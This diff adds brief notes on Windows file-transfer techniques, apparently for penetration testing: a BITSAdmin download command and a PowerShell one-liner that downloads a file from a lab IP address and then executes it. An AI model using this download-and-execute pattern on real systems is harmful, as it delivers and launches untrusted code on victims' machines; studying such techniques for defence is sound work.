@@ -1,0 +1,5 @@
+1. BITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress.
+- bitsadmin /transfer debjob /download /priority normal http://cdimage.debian.org/download/test.txt C:\xampp\htdocs\text.txt
+
+2. PowerShell
+- PowerShell (New-Object System.Net.WebClient).DownloadFile('http://10.0.2.26/test.txt','test.txt');(New-Object -com Shell.Application).ShellExecute('test.txt');
